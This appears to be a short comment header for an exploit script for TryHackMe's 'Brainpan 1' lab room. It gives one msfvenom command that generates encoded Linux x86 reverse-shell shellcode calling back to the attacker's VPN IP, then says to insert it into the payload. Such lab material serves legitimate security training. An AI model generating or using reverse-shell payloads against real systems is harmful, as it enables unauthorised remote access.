# TryHackMe's "Brainpan 1" room (https://tryhackme.com/room/brainpan).

# First of all create your shellcode for linux with:
(msfvenom -p linux/x86/  shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00")
# Introduce the shellcode in the payload.


